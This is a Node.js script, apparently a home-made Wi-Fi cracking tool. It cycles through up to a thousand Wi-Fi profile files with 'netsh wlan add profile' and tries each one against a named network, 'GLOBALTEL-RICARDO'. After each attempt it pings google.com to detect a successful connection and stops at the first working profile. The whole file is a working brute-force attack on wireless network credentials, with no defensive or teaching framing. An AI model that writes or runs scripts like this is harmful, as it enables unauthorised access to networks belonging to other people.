import { execSync } from 'child_process';
import fs from 'fs';
import ping from 'ping';

fs.readdir('C:\\Users\\juan1\\Desktop\\nethack\\files', async (err, files) => {
    if(err) throw err;
    let max = 1000;
    for(let j = 0; j < max; j++){
        console.log('starting')
        execSync(`netsh wlan add profile filename="files/${files[j]}"`);
        console.log(`now running on file ${files[j]}`);
        execSync(`netsh wlan connect name="GLOBALTEL-RICARDO"`, { encoding: 'utf-8' }); 
        

        await sleep(13000);
        let host = "www.google.com";
        ping.sys.probe(host, function(active){
            var info = active ? 'IP ' + host + ' = Active' : 'IP ' + host + ' = Non-Active';

            console.log(info);
            if(active){
                console.log('Success!');
                j = max
            }
        });
        await sleep(2500)
    }
})

const sleep = (ms) => {
    return new Promise(r => setTimeout(r, ms));
}

